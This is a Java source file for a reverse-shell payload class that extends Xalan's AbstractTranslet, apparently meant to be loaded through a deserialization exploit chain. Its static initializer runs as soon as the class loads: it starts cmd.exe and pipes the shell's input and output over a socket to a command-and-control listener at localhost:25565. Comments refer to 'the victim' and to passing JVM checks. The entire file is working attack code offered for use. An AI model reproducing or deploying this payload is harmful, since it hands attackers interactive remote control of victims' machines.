import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

// implemented in java to be compatible with any jvm language the victim uses

@Deprecated
public class ReverseShell extends AbstractTranslet {
    static {
        System.err.println("You got pwned!");
        try {
            Process cmd = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
            try(Socket c2 = new Socket("localhost", 25565)) {

                InputStream
                        cmdInputStream = cmd.getInputStream(),
                        cmdErrorStream = cmd.getErrorStream(),
                        c2InputStream = c2.getInputStream();
                OutputStream
                        cmdOutputStream = cmd.getOutputStream(),
                        c2OutputStream = c2.getOutputStream();

                while(!c2.isClosed()) {

                    while(cmdInputStream.available() > 0)
                        c2OutputStream.write(cmdInputStream.read());
                    while(cmdErrorStream.available() > 0)
                        c2OutputStream.write(cmdErrorStream.read());
                    while(c2InputStream.available() > 0)
                        cmdOutputStream.write(c2InputStream.read());

                    c2OutputStream.flush();
                    cmdOutputStream.flush();

                    Thread.sleep(50);

                    try {
                        cmd.exitValue();
                        break;
                    } catch (Exception ignored) { }
                }
            }
            cmd.destroy();
        } catch (Throwable ignored) {}
    }

    // to satisfy jvm pre-checks
    public ReverseShell() {}
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {}
}